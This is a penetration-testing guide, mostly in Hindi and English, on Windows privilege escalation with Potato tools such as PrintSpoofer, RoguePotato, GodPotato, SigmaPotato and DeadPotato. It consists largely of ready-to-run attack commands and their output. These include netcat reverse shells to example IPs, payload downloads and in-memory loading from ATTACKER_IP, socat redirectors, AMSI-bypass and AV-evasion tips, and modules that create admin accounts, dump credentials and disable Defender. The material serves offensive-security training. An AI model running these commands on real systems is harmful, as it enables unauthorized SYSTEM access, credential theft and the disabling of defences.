# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato doesn't work** on Windows Server 2019 and Windows 10 build 1809 onwards. However, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** can be used to **leverage the same privileges and gain `NT AUTHORITY\SYSTEM`** level access. This [blog post](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) goes in-depth on the `PrintSpoofer` tool, which can be used to abuse impersonation privileges on Windows 10 and Server 2019 hosts where JuicyPotato no longer works.

> [!TIP]
> एक आधुनिक विकल्प, जिसे 2024–2025 में अक्सर मेंटेन किया जा रहा है, SigmaPotato (GodPotato का fork) है जो in-memory/.NET reflection उपयोग और विस्तारित OS सपोर्ट जोड़ता है। नीचे त्वरित उपयोग देखें और References में repo।

Related pages for background and manual techniques:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## आवश्यकताएँ और सामान्य समस्याएँ

All the following techniques rely on abusing an impersonation-capable privileged service from a context holding either of these privileges:

- SeImpersonatePrivilege (most common) or SeAssignPrimaryTokenPrivilege
- High integrity is not required if the token already has SeImpersonatePrivilege (typical for many service accounts such as IIS AppPool, MSSQL, etc.)

Privileges जल्दी जाँचें:
```cmd
whoami /priv | findstr /i impersonate
```
ऑपरेशनल नोट्स:

- यदि आपका शेल ऐसे restricted token के अंतर्गत चलता है जिसमें SeImpersonatePrivilege नहीं है (कुछ संदर्भों में Local Service/Network Service के लिए सामान्य), तो खाते के डिफ़ॉल्ट privileges FullPowers का उपयोग करके पुनः प्राप्त करें, फिर एक Potato चलाएँ। उदाहरण: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer को Print Spooler service चलती हुई और स्थानीय RPC endpoint (spoolss) पर पहुँच योग्य चाहिए। उन हार्डंड वातावरणों में जहाँ Spooler को PrintNightmare के बाद disabled कर दिया गया है, RoguePotato/GodPotato/DCOMPotato/EfsPotato को प्राथमिकता दें।
- RoguePotato को TCP/135 पर पहुँच योग्य OXID resolver चाहिए। यदि egress अवरुद्ध है, तो एक redirector/port-forwarder का उपयोग करें (नमूना नीचे देखें)। पुराने बिल्ड्स में -f flag चाहिए था।
- EfsPotato/SharpEfsPotato MS-EFSR का दुरुपयोग करते हैं; यदि एक pipe अवरुद्ध है, तो वैकल्पिक pipes आज़माएँ (lsarpc, efsrpc, samr, lsass, netlogon).
- RpcBindingSetAuthInfo के दौरान Error 0x6d3 आमतौर पर अज्ञात/अनसमर्थित RPC authentication service को सूचित करता है; एक अलग pipe/transport आज़माएँ या सुनिश्चित करें कि target service चल रही है।
- “Kitchen-sink” forks जैसे DeadPotato अतिरिक्त payload modules (Mimikatz/SharpHound/Defender off) पैक करते हैं जो डिस्क को छूते हैं; slim originals की तुलना में उच्च EDR detection की अपेक्षा रखें।

## त्वरित डेमो

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
नोट्स:
- आप -i का उपयोग वर्तमान कंसोल में एक interactive process spawn करने के लिए कर सकते हैं, या -c का उपयोग एक one-liner चलाने के लिए।
- Spooler service आवश्यक है। अगर यह disabled है, तो यह असफल होगा।

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
यदि outbound 135 blocked है, तो अपने redirector पर socat के माध्यम से OXID resolver को pivot करें:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato एक नया COM abuse primitive है, जो देर 2022 में रिलीज़ हुआ और Spooler/BITS के बजाय **PrintNotify** service को लक्षित करता है। यह बाइनरी PrintNotify COM server को instantiate करता है, एक fake `IUnknown` डालता है, और फिर `CreatePointerMoniker` के माध्यम से एक privileged callback ट्रिगर करता है। जब PrintNotify service (जो **SYSTEM** के रूप में चल रही होती है) वापस कनेक्ट करती है, तो प्रोसेस लौटे हुए token की duplicate बनाकर दिए गए payload को full privileges के साथ spawn कर देता है।

Key operational notes:

* Windows 10/11 और Windows Server 2012–2022 पर काम करता है बशर्ते Print Workflow/PrintNotify service इंस्टॉल हो (यह तब भी मौजूद रहती है जब legacy Spooler को post-PrintNightmare डिसेबल किया गया हो)।
* कॉल करने वाले context के पास **SeImpersonatePrivilege** होना आवश्यक है (आमतौर पर IIS APPPOOL, MSSQL, और scheduled-task service accounts पर)।
* यह या तो सीधे command स्वीकार करता है या interactive mode, ताकि आप मूल console में बने रह सकें। उदाहरण:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* क्योंकि यह पूरी तरह COM-based है, इसलिए किसी named-pipe listeners या external redirectors की आवश्यकता नहीं है, जिससे यह उन होस्ट्स पर एक drop-in replacement बन जाता है जहाँ Defender RoguePotato’s RPC binding को ब्लॉक करता है।

Ink Dragon जैसे operators SharePoint पर ViewState RCE मिलने के तुरंत बाद PrintNotifyPotato चलाते हैं ताकि `w3wp.exe` worker से SYSTEM पर pivot किया जा सके, और फिर ShadowPad इंस्टॉल करने से पहले SYSTEM हासिल कर लिया जाये।

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
टिप: यदि कोई pipe विफल हो या EDR उसे ब्लॉक कर दे, तो अन्य समर्थित pipes आज़माएँ:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
- SeImpersonatePrivilege मौजूद होने पर Windows 8/8.1–11 और Server 2012–2022 पर काम करता है।
- इंस्टॉल किए गए runtime से मेल खाता हुआ binary लें (उदा., आधुनिक Server 2022 पर `GodPotato-NET4.exe`)।
- यदि आपकी प्रारंभिक execution primitive webshell/UI है और उसमें short timeouts हैं, तो payload को script के रूप में stage करें और लंबी inline command की बजाय GodPotato से उसे चलाने के लिए कहें।

writable IIS webroot से त्वरित स्टेजिंग पैटर्न:
```powershell
iwr http://ATTACKER_IP/GodPotato-NET4.exe -OutFile gp.exe
iwr http://ATTACKER_IP/shell.ps1 -OutFile shell.ps1  # contains your revshell
./gp.exe -cmd "powershell -ep bypass C:\inetpub\wwwroot\shell.ps1"
```
### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato दो वेरिएंट प्रदान करता है जो service DCOM objects को लक्षित करते हैं जो RPC_C_IMP_LEVEL_IMPERSONATE पर डिफ़ॉल्ट होते हैं। प्रदान किए गए binaries को build करें या उनका उपयोग करें और अपना कमांड चलाएँ:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (अपडेट किया गया GodPotato fork)

SigmaPotato .NET reflection के माध्यम से मेमोरी में निष्पादन और PowerShell reverse shell helper जैसी आधुनिक सुविधाएँ जोड़ता है।
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), साथ ही सरल heuristics को भ्रमित करने के लिए `VirtualAllocExNuma()` के जरिए एक बुनियादी AV evasion ट्रिक।
- PowerShell Core वातावरणों के लिए .NET 2.0 के खिलाफ कंपाइल किया गया अलग `SigmaPotatoCore.exe`।

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato GodPotato की OXID/DCOM impersonation chain को बरकरार रखता है, लेकिन इसमें post-exploitation मददगार जोड़ दिए गए हैं ताकि ऑपरेटर बिना अतिरिक्त टूलिंग के तुरंत SYSTEM हासिल कर सकें और persistence/collection कर सकें।

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — SYSTEM के रूप में कोई भी कमांड spawn करें।
- `-rev <ip:port>` — तेज़ reverse shell।
- `-newadmin user:pass` — persistence के लिए एक local admin बनाएं।
- `-mimi sam|lsa|all` — Mimikatz डालकर चलाएँ और credentials dump करें (डिस्क को छूता है, noisy)।
- `-sharphound` — SYSTEM के रूप में SharpHound collection चलाएँ।
- `-defender off` — Defender real-time protection को निष्क्रिय करें (बहुत noisy)।

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
क्योंकि यह अतिरिक्त binaries के साथ आता है, AV/EDR फ्लैग्स अधिक मिलने की आशंका रखें; जब stealth महत्वपूर्ण हो तो slimmer GodPotato/SigmaPotato का उपयोग करें।

## References

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – service accounts के लिए default token privileges बहाल करें](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [HTB: Job — LibreOffice macro → IIS webshell → GodPotato to SYSTEM](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
